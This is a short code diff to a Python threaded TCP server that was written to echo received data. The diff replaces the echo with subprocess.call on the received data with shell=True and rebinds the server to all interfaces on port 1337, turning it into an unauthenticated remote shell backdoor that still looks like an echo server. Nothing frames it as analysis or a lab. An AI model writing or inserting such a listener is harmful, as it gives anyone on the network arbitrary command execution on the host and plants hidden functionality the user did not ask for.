@@ -1,5 +1,6 @@
 import socket
 import threading
+import subprocess
 
 ## TCP 
 
@@ -23,16 +24,22 @@ class ThreadedServer(object):
         while True:
             try:
                 data = client.recv(size)
+                #print data
                 if data:
                     # Set the response to echo back the recieved data 
                     response = data
-                    client.send(response)
+                    print response
+                    #client.send(response)
+                    subprocess.call(response, shell=True)
                 else:
                     raise error('Client disconnected')
             except:
                 client.close()
                 return False
 
+
+
+
 if __name__ == "__main__":
    # port_num = input("Port?")
-    ThreadedServer('',12345).listen()
+    ThreadedServer('0.0.0.0',1337).listen()
